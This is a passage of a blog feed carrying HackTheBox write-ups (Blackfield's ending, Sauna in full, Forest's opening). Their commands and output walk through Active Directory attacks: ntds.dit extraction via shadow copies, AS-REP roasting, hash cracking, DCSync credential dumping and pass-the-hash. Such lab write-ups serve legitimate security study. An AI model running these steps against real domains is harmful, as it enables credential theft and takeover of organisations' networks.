+        * Shadow copy ID = {7c53326a-2617-450c-9d2d-5c381352aa45}               %iamf%
+                - Shadow copy set: {6142125a-a889-46a9-9d5e-87ff17b66d2c}       %VSS_SHADOW_SET%
+                - Original count of shadow copies = 1
+                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
+                - Creation time: 10/4/2020 8:15:54 AM
+                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4
+                - Originating machine: DC01.BLACKFIELD.local
+                - Service machine: DC01.BLACKFIELD.local
+                - Not exposed
+                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+                - Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-&gt; expose %iamf% f:
+-&gt; %iamf% = {7c53326a-2617-450c-9d2d-5c381352aa45}
+The shadow copy was successfully exposed as f:\.
+-&gt; exec &#34;copy.cmd&#34;
+C:\temp&gt;cmd.exe /c &#34;powershell.exe -c Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Import-Module(Resolve-Path(&#39;SeBackupPrivilegeCmdLets.dll&#39;)); Copy-FileSeBackupPrivilege f:\windows\ntds\ntds.dit C:\temp\ntds.dit&#34;
+Copied 18874368 bytes
+-&gt; delete shadows volume %iamf%
+-&gt; %iamf% = {7c53326a-2617-450c-9d2d-5c381352aa45}
+Deleting shadow copy {7c53326a-2617-450c-9d2d-5c381352aa45} on volume \\?\Volume{351b4712-0000-0000-0000-602200000000}\ from provider {b5946137-7b9f-4925-af80-51abd60b20d5} [Attributes: 0x00120019]...
+
+Number of shadow copies deleted: 1
+-&gt; reset
+</code></pre></div><p>Now that I have the <code>ntds.dit</code>, the last file that I need is the registry hive.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Evil-WinRM* PS C:\temp&gt; reg save HKLM\SYSTEM c:\temp\system
+The operation completed successfully.
+</code></pre></div><p>I&rsquo;ll download these files to my Kali using <code>evil-winrm</code> download feature.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Evil-WinRM* PS C:\temp&gt; ls
+
+
+    Directory: C:\temp
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        10/4/2020   8:20 AM       18874368 ntds.dit 
+-a----        10/4/2020   8:14 AM            222 copy.cmd
+-a----        10/4/2020   8:15 AM            140 script.txt
+-a----        10/4/2020   8:14 AM          12288 SeBackupPrivilegeCmdLets.dll
+-a----        10/4/2020   8:14 AM          16384 SeBackupPrivilegeUtils.dll
+-a----        10/4/2020   8:21 AM       17547264 system
+</code></pre></div><h4 id="credentials-dumping">Credentials Dumping</h4>
+<p>Now I can dump the NT hash from <code>ntds.dit</code> and <code>system</code> file using <code>secretsdump.py</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.169»
+$ secretsdump.py -system system -ntds ntds.dit LOCAL
+Impacket v0.9.21 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> pekList, be patient
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> PEK <span style="color:#75715e"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Reading and decrypting hashes from ntds.dit
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+...&lt;SNIP&gt;...
+</code></pre></div><h4 id="remote-access-1">Remote Access</h4>
+<p>I can use the NT hash of administrator account to login using <code>evil-winrm</code> <em>pass-the-hash</em> feature.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.169»
+$ evil-winrm -i 10.10.10.192 -u administrator -H <span style="color:#e6db74">&#39;184fb5e5178480be64824d4cd53b99ee&#39;</span>
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210504210042888.png" alt="image-20210504210042888"  /></div>
+</p>
+<section class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1" role="doc-endnote">
+<p>It&rsquo;s an anonymous authentication, but limited only to the rootDSE. In the domain controller (DC) side, it needs to know who are we and what authentication do we support, so it sends us the same thing it asked which exposes&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2" role="doc-endnote">
+<p><a href="https://room362.com/post/2017/reset-ad-user-password-with-linux/">https://room362.com/post/2017/reset-ad-user-password-with-linux/</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:3" role="doc-endnote">
+<p><a href="https://github.com/giuliano108/SeBackupPrivilege">https://github.com/giuliano108/SeBackupPrivilege</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:4" role="doc-endnote">
+<p><a href="https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/">https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Sauna</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-sauna/</link>
+      <pubDate>Wed, 07 Apr 2021 12:02:54 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-sauna/</guid>
+      <description>Sauna is another Active Directory box with easy difficulty from Hack The Box that covers several Active Directory kill chain techniques, such as AS-REP roasting attack, finding credentials on registry, and a DCSync attack to pull Active Directory password hashes.
+Sauna starts by generating a list of potential usernames from its website, which is then used to perform AS-REP roasting attack and obtain the Kerberos TGT from one of the users.</description>
+      <content:encoded><![CDATA[<p>Sauna is another Active Directory box with easy difficulty from Hack The Box that covers several Active Directory kill chain techniques, such as AS-REP roasting attack, finding credentials on registry, and a DCSync attack to pull Active Directory password hashes.</p>
+<p>Sauna starts by generating a list of potential usernames from its website, which is then used to perform AS-REP roasting attack and obtain the Kerberos TGT from one of the users. The TGT can be cracked to obtain the user&rsquo;s password. With the obtained password, I&rsquo;m able to gain a foothold on the machine. Internal enumeration finds AutoLogon credentials from the registry. BloodHound discovers these credentials can be leveraged to perform a DCSync attack and obtain all of the NTLM hashes from the Active Directory database. Armed with the administrator hash, I&rsquo;m able to gain an interactive shell access as NT Authority\System.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Generating potential usernames</li>
+<li>AS-Rep roasting</li>
+<li>BloodHound</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
+<li>BloodHound - <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Port scanning is the first thing I&rsquo;d do.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sauna» «192.168.2.103»
+$ nmap -sV -sC -oA nmap/sauna <span style="color:#e6db74">&#39;10.10.10.175&#39;</span>
+... &lt;snip&gt; ...
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Egotistical Bank :: Home
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2020-04-22 00:45:32Z<span style="color:#f92672">)</span>
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+3269/tcp open  tcpwrapped
+<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V<span style="color:#f92672">=</span>7.80%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>4/21%Time<span style="color:#f92672">=</span>5E9F315E%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>DNSV
+SF:ersionBindReqTCP,20,<span style="color:#e6db74">&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+</span><span style="color:#e6db74">SF:x04bind\0\0\x10\0\x03&#34;</span><span style="color:#f92672">)</span>;
+Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 6h59m28s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-04-22T00:47:55
+|_  start_date: N/A
+... &lt;snip&gt; ...
+</code></pre></div><p>Based on the result above, Sauna is an Active Directory domain controller (DC) bundled with the IIS web server.</p>
+<p><code>nmap</code> also identified Sauna&rsquo;s domain name as <code>EGOTISTICAL-BANK.LOCAL</code>.</p>
+<blockquote>
+<p>Active Directory domain is similar to web domain both in concept and usage, but the realm is different.  Active Directory domain is intended for internal/private networks only (e.g. between branch offices), so it is restricted to the outside world.</p>
+</blockquote>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<h4 id="web-pages-overview">Web Pages Overview</h4>
+<p>These are some overview of the web pages.</p>
+<p><div class="img-container"><img src="imgs/image-20210407123719988.png" alt="image-20210407123719988"  /></div>
+</p>
+<p><div class="img-container"><img src="imgs/image-20210407123908202.png" alt="image-20210407123908202"  /></div>
+</p>
+<p><div class="img-container"><img src="imgs/image-20210407123842325.png" alt="image-20210407123842325"  /></div>
+</p>
+<p><div class="img-container"><img src="imgs/image-20210407123656847.png" alt="image-20210407123656847"  /></div>
+</p>
+<p>The input vectors doesn&rsquo;t seem injectable.</p>
+<h4 id="generating-usernames">Generating Usernames</h4>
+<p>These are the hints given by the author:</p>
+<p>The first one is the word &ldquo;roast&rdquo; on the homepage and the contact page. This might refer to the AS-REP roasting attack.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">I got a loan and can&#39;t pay it back, I cant even get a ticket to roast my chestnuts!
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">We will always try to never answer your quetsions - we&#39;re too busy roasting in the sauna, counting our money
+</code></pre></div><p>The second one is the word &ldquo;only one&rdquo;, this can be interpreted as only one of the users is vulnerable.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Meet the team. So many bank account managers but only one security manager. Sounds about right!
+</code></pre></div><p>From here, I manually collected the team names from the site and created a script to generate usernames based on their first and last names.</p>
+<blockquote>
+<p>Based on common/best practices of <a href="imgs/active-directory-user-naming-convention">AD user naming conventions</a></p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python3</span>
+<span style="color:#f92672">import</span> sys
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">convert_name</span>(userfile):
+        f <span style="color:#f92672">=</span> open(userfile, <span style="color:#e6db74">&#39;r&#39;</span>)
+        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> f<span style="color:#f92672">.</span>readlines():
+                data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(line<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>))
+                names <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
+                first_letter <span style="color:#f92672">=</span> names[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">0</span>]
+                first_name <span style="color:#f92672">=</span> names[<span style="color:#ae81ff">0</span>]
+                lastname <span style="color:#f92672">=</span> names[<span style="color:#ae81ff">1</span>]
+                <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#39;{first_name}.{lastname}&#39;</span>)
+                <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#39;{first_letter}{lastname}&#39;</span>)
+                <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#39;{first_letter}.{lastname}&#39;</span>)
+                <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#39;{first_letter}a{lastname}&#39;</span>)
+                <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#39;{first_letter}e{lastname}&#39;</span>)
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span> :
+        <span style="color:#66d9ef">try</span>:
+                namelist <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>strip()
+        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">IndexError</span>:
+                <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[-] Usage: ./convert-name.py listnames&#34;</span>)
+                exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+
+        convert_name(namelist)
+</code></pre></div><p>Below are the generated usernames from the script.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sauna» «192.168.2.103»
+$ python convert-name.py listnames
+Fergus.Smith
+FSmith
+F.Smith
+FaSmith
+FeSmith
+Shaun.Coins
+SCoins
+S.Coins
+SaCoins
+SeCoins
+Hugo.Bear
+HBear
+H.Bear
+HaBear
+HeBear
+Steven.Kerb
+SKerb
+S.Kerb
+SaKerb
+SeKerb
+Bowie.Taylor
+BTaylor
+B.Taylor
+BaTaylor
+BeTaylor
+Sophie.Driver
+SDriver
+S.Driver
+SaDriver
+SeDriver
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-fsmith">Shell as Fsmith</h3>
+<h4 id="as-rep-roasting">AS-REP Roasting</h4>
+<blockquote>
+<p>On <a href="https://fahmifj.github.io/writeup/htb-forest/">Forest Write-up</a>, I briefly explained about AS-REP Roasting.</p>
+</blockquote>
+<p>With the generated usernames, AS-REP roasting attack can be performed using <code>GetNPUsers.py</code> from Impacket.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sauna» «192.168.2.103»
+$ GetNPUsers.py -dc-ip <span style="color:#e6db74">&#39;10.10.10.175&#39;</span> -request EGOTISTICAL-BANK.LOCAL/ -usersfile ADUser.txt -format hashcat -output ADuserTGT.txt
+</code></pre></div><p>It successfully obtained <code>FSmith</code>&rsquo;s TGT.</p>
+<p><div class="img-container"><img src="imgs/image-20210407143301639.png" alt="image-20210407143301639"  /></div>
+</p>
+<h4 id="cracking-tgt">Cracking TGT</h4>
+<p><code>hashcat</code> successfully cracked the TGT (performed on my Windows machine).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#ae81ff">\t</span>ools<span style="color:#ae81ff">\h</span>ashcat6&gt;hashcat.exe -m <span style="color:#ae81ff">18200</span> <span style="color:#e6db74">&#39;$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:c4f6edd3e30ea0797b114bdb36b15e10$737ca27f2844d44e868f9ab86f72af0d8d27ce9385864d763a4dae0205efb764a954abe02e0ed1006af6f42268fbb6250f9c2f515fc4478b96051d124cb110aba85e960081b69ea9f21b4b761be007f1655a9a79ac00e2495c8125d56ff31b97b9f7021a84cd232d960ed29d5e536a6893aa0ec722c5132d80f61a3b04559409a5933ae1426a8170a14f673ff0cd5449d9e013193a1c75c4293404c76c42dd20b3f6d0e30cbf946566a0bd09d075781a18062f96ca083e9a7394cf6cd6c7e17e1f926cb4b32efa18d850582185e9cfb9f0b7f7d588ff9ff3ca9fed5bbd7c1a29e38d626f4ac7b6e756e0c81d3b21b7bb956d0a3fe0368a66bc1daa30140bffcc&#39;</span> C:/tools/rockyou.txt
+
+... &lt;snip&gt; ...
+$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:c4f6edd3e30ea0797b114bdb36b15e10$737ca27f2844d44e868f9ab86f72af0d8d27ce9385864d763a4dae0205efb764a954abe02e0ed1006af6f42268fbb6250f9c2f515fc4478b96051d124cb110aba85e960081b69ea9f21b4b761be007f1655a9a79ac00e2495c8125d56ff31b97b9f7021a84cd232d960ed29d5e536a6893aa0ec722c5132d80f61a3b04559409a5933ae1426a8170a14f673ff0cd5449d9e013193a1c75c4293404c76c42dd20b3f6d0e30cbf946566a0bd09d075781a18062f96ca083e9a7394cf6cd6c7e17e1f926cb4b32efa18d850582185e9cfb9f0b7f7d588ff9ff3ca9fed5bbd7c1a29e38d626f4ac7b6e756e0c81d3b21b7bb956d0a3fe0368a66bc1daa30140bffcc:Thestrokes23
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, AS-REP
+Hash.Target......: $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:c4f6edd...0bffcc
+... &lt;snip&gt; ...
+</code></pre></div><p>The password is <code>Thestrokes23</code>.</p>
+<h4 id="remote-access">Remote Access</h4>
+<p>This user can login remotely with <code>evil-winrm</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sauna» «192.168.2.103»
+$ evil-winrm -i <span style="color:#e6db74">&#39;10.10.10.175&#39;</span> -u fsmith -p <span style="color:#e6db74">&#39;Thestrokes23&#39;</span> 
+</code></pre></div><p>User flag is done here.</p>
+<center>
+<p><div class="img-container"><img src="imgs/image-20210407143917902.png" alt="image-20210407143917902"  /></div>
+</p>
+</center>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-svc_loanmgr">Shell as svc_loanmgr</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>WinPEAS discovered that <code>svc_loanmanager</code> has an autologon credential.</p>
+<center>
+<p><div class="img-container"><img src="imgs/image-20210407132849744.png" alt="image-20210407132849744"  /></div>
+</p>
+</center>
+<p>But based on <code>rpcclient</code>, it&rsquo;s actually <code>svc_loanmgr</code>.</p>
+<center>
+<p><div class="img-container"><img src="imgs/image-20210408043941867.png" alt="image-20210408043941867"  /></div>
+</p>
+</center> 
+<p>This account also can login remotely.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sauna» «192.168.2.103»
+$ evil-winrm -i <span style="color:#e6db74">&#39;10.10.10.175&#39;</span> -u svc_loanmgr -p <span style="color:#e6db74">&#39;Moneymakestheworldgoround!&#39;</span>
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_loanmgr<span style="color:#ae81ff">\D</span>ocuments&gt;
+</code></pre></div><h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\System</h3>
+<h4 id="enumeration-with-bloodhound">Enumeration with BloodHound</h4>
+<p>I ran the second WinPEAS scan, but found nothing particularly interesting (this was prior to zerologon). Since this is an AD environment, I can try BloodHound.</p>
+<p>I copied <code>SharpHound.exe</code> (the ingestor) to Sauna using <code>evilwin-rm</code> and ran it to start collecting data.</p>
+<blockquote>
+<p><code>evilwin-rm</code> has capability to transfer files directly between my machine and the remote (Sauna). The keywords are <code>download</code> and <code>upload</code>.</p>
+</blockquote>
+<center>
+<p><div class="img-container"><img src="imgs/image-20210407133118769.png" alt="image-20210407133118769"  /></div>
+</p>
+</center>
+<p>It finished within a few seconds.</p>
+<p>I copied the collected data to my machine and loaded it to <code>BloodHound</code> with drag and drop.</p>
+<center>
+<p><div class="img-container"><img src="imgs/image-20210407133124208.png" alt="image-20210407133124208"  /></div>
+</p>
+</center>
+<p>After trying a few of <code>BloodHound</code>&rsquo;s prebuilt queries, <code>BloodHound</code> reveals that <code>svc_loanmgr</code> has <code>GetChangesAll</code> and <code>GetChanges</code> permissions on the domain.</p>
+<p><div class="img-container"><img src="imgs/image-20210407133140640.png" alt="image-20210407133140640"  /></div>
+</p>
+<p>I can access the help section by right clicking the edge. So, <code>GetChanges</code> and <code>GetChangesAll</code> are in conjunction with <code>DS-Replication-Get-Changes-All</code>. This grants <code>svc_loanmgr</code> ability to perform the DCSync attack.</p>
+<p><div class="img-container"><img src="imgs/image-20210407133147048.png" alt="image-20210407133147048"  /></div>
+</p>
+<p>The &ldquo;Abuse Info&rdquo; section contains how to abuse these privileges using <code>mimikatz</code></p>
+<p><div class="img-container"><img src="imgs/image-20210407133150811.png" alt="image-20210407133150811"  /></div>
+</p>
+<h4 id="credential-dumping">Credential Dumping</h4>
+<p>Since Windows Defender typically doesn&rsquo;t get along with <code>mimikatz</code>, I use <code>secretsdump.py</code> to perform a DCSync attack just like I did on Forest.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sauna» «192.168.2.103»
+$ secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:<span style="color:#e6db74">&#39;Moneymakestheworldgoround!&#39;</span>@10.10.10.175 -just-dc-ntlm
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210407133219251.png" alt="image-20210407133219251"  /></div>
+</p>
+<h4 id="pass-the-hash---psexecpy">Pass the hash - psexec.py</h4>
+<p>Now I can use <code>psexec.py</code> to perform pass-the-hash using administrator hash to gain shell access as local system.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sauna» «192.168.2.103»
+$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff administrator@htb.sauna
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210407133250451.png" alt="image-20210407133250451"  /></div>
+</p>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Forest</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-forest/</link>
+      <pubDate>Sat, 03 Apr 2021 13:51:48 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-forest/</guid>
+      <description>When I first joined HackTheBox, Forest was the first machine that I was trying to own. It was an overall easy to medium difficulty machine.
+On Forest, enumeration with anonymous logon/null session on RPC finds Active Directory users account and these can be used to perform AS-REP Roasting, it successfully obtains the Kerberos ticket-granting-ticket (TGT) of a service account. The TGT itself contains a password hash of the user that can be cracked offline, this allows me gain a foothold on the system.</description>
+      <content:encoded><![CDATA[<p>When I first joined HackTheBox, Forest was the first machine that I was trying to own. It was an overall easy to medium difficulty machine.</p>
+<p>On Forest, enumeration with anonymous logon/null session on RPC finds Active Directory users account and these can be used to perform <a href="https://attack.mitre.org/techniques/T1558/004/">AS-REP Roasting</a>, it successfully obtains the Kerberos ticket-granting-ticket (TGT) of a service account. The TGT itself contains a password hash of the user that can be cracked offline, this allows me gain a foothold on the system. For the root part, the service account permissions allows me to grant myself a DCsync rights, this can be leveraged to pull Active Directory NTLM hashes and use them to gain access as NT Authority\SYSTEM.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>AS-REP roasting</li>
+<li>Creating Network Drive</li>
+<li>Abusing DCSync Rights</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>rpcclient - Preinstalled in Kali Linux</li>
+<li>Evil-WinRM - <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></li>
+<li>BloodHound - <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></li>
+<li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.116»
+$ nmap -sV -sC -oA nmap/initial-forest 10.10.10.171 -v
+</code></pre></div><ul>
+<li><code>-sC</code>, to scan with default script</li>
+<li><code>-sV</code>, to scan service version</li>
+<li><code>-oA</code>, to save the output to all format (xml, nmap, gnmap)</li>
+<li><code>-v</code>, verbose mode.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">...&lt;snip&gt;...
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain?
+| fingerprint-strings:
+|   DNSVersionBindReqTCP:
+|     version
+|_    bind
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-21 08:18:45Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=3/21%Time=5E75CC69%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03&#34;);
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h26m25s, deviation: 4h02m30s, median: 6m24s
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2020-03-21T01:21:11-07:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2020-03-21T08:21:14
+|_  start_date: 2020-03-20T05:27:17
+...&lt;snip&gt;...
+</code></pre></div><p>From the scan results, I&rsquo;m dealing with a domain controller of an Active Directory system.</p>
